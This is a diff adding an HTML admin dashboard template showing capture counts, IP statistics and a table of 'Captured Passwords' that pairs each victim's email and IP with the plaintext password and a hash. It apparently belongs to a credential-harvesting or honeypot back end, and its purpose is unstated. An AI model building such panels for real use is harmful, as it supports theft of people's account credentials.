@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 2rem;
+        }
+        .nav {
+            background-color: white;
+            padding: 1rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin-bottom: 2rem;
+        }
+        .nav a {
+            color: #1a73e8;
+            text-decoration: none;
+            margin-right: 1rem;
+        }
+        .nav a:hover {
+            text-decoration: underline;
+        }
+        .card {
+            background-color: white;
+            padding: 1.5rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin-bottom: 1rem;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+        .stat-card {
+            background-color: white;
+            padding: 1.5rem;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        .stat-card h3 {
+            margin: 0;
+            color: #666;
+        }
+        .stat-card p {
+            margin: 0.5rem 0 0;
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #1a73e8;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Admin Dashboard</h1>
+            <a href="/admin/logout">Logout</a>
+        </div>
+        
+        <div class="nav">
+            <a href="/admin">Dashboard</a>
+            <a href="/admin/ip-management">IP Management</a>
+        </div>
+
+        <div class="stats">
+            <div class="stat-card">
+                <h3>Total Captures</h3>
+                <p>{{ total_captures }}</p>
+            </div>
+            <div class="stat-card">
+                <h3>Active IPs</h3>
+                <p>{{ active_ips }}</p>
+            </div>
+            <div class="stat-card">
+                <h3>Blocked IPs</h3>
+                <p>{{ blocked_ips }}</p>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Recent Activity</h2>
+            <div class="activity-list">
+                {% for activity in recent_activity %}
+                <div class="activity-item">
+                    <p>{{ activity.timestamp }} - {{ activity.description }}</p>
+                </div>
+                {% endfor %}
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Captured Passwords (Last 10)</h2>
+            <div class="activity-list">
+                {% if captured_passwords %}
+                    <table style="width:100%; border-collapse: collapse;">
+                        <thead>
+                            <tr>
+                                <th style="border-bottom: 1px solid #eee; text-align:left; padding: 8px;">Timestamp</th>
+                                <th style="border-bottom: 1px solid #eee; text-align:left; padding: 8px;">IP</th>
+                                <th style="border-bottom: 1px solid #eee; text-align:left; padding: 8px;">Email</th>
+                                <th style="border-bottom: 1px solid #eee; text-align:left; padding: 8px;">Password</th>
+                                <th style="border-bottom: 1px solid #eee; text-align:left; padding: 8px;">Hashed</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                        {% for entry in captured_passwords %}
+                            <tr>
+                                <td style="padding: 8px;">{{ entry.timestamp }}</td>
+                                <td style="padding: 8px;">{{ entry.ip }}</td>
+                                <td style="padding: 8px;">{{ entry.email if entry.email is defined else '' }}</td>
+                                <td style="padding: 8px;">{{ entry.original_password }}</td>
+                                <td style="padding: 8px; word-break: break-all;">{{ entry.hashed_password }}</td>
+                            </tr>
+                        {% endfor %}
+                        </tbody>
+                    </table>
+                {% else %}
+                    <p>No passwords captured yet.</p>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+</body>
+</html> 
